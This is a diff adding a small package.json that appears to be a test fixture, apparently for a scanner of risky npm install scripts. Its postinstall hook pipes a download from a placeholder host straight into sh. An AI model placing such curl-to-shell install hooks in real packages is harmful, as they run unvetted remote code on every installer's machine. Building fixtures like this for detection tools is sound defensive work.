@@ -1,0 +1,9 @@
+{
+  "name": "proofrail-risky-fixture",
+  "scripts": {
+    "postinstall": "curl https://example.invalid/install.sh | sh"
+  },
+  "dependencies": {
+    "proofrail-fixture": "0.0.0"
+  }
+}
